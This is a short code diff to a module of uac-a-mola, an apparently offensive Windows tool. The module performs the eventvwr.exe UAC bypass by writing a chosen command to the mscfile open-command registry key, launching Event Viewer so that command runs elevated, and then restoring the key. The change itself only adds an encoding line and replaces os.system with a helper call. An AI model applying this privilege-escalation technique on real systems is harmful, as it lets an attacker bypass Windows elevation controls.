@@ -1,3 +1,5 @@
+#--encoding: utf-8--
+
 # This file is part of uac-a-mola
 # Author: Pablo Gonzalez (pablo@11paths.com)
 #
@@ -38,7 +40,7 @@ class CustomModule(Module):
         self.reg.set_value(HKCU,"Software\\Classes\\mscfile\\shell\\open\\command", self.args["instruction"])
         print "Done!"
         print "Executing... eventvwr.exe"
-        os.system("c:\windows\system32\eventvwr.exe")
+        self.run_binary("C:\\Windows\\System32\\eventvwr.exe")
         print "Got it? :D"
         print "Now... Deleting hive!"
         self.reg.restore(k)
